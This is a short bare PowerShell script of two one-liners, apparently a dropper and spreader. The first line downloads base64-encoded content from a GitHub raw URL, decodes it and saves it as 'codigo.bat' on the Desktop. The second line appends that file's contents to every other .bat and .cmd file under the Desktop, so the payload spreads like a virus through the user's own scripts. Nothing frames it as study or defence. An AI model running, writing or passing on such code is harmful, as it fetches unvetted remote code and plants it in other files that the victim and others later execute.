powershell -NoProfile -Command "$u='https://raw.githubusercontent.com/system-32-hue/test/refs/heads/main/rest';$p=Join-Path ([Environment]::GetFolderPath('Desktop')) 'codigo.bat';try{$b=(Invoke-WebRequest -UseBasicParsing $u).Content.Trim();[IO.File]::WriteAllText($p,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)),[Text.UTF8Encoding]::new($false));Write-Host 'INSTALLED'}catch{Write-Host $_.Exception.Message}"
powershell -NoProfile -Command "$d=[Environment]::GetFolderPath('Desktop'); $src=Join-Path $d 'codigo.bat'; if(!(Test-Path $src)){Write-Host 'codigo.bat nao encontrado';exit}; $s=Get-Content -Raw $src; Get-ChildItem $d -File -Recurse | Where-Object {$_.Extension -in '.bat','.cmd' -and $_.FullName -ne $src -and $_.Name -notlike '*.bak'} | ForEach-Object {Copy-Item $_.FullName ($_.FullName+'.bak') -Force; Add-Content -LiteralPath $_.FullName -Value $s}; Write-Host '...---...'"
exit
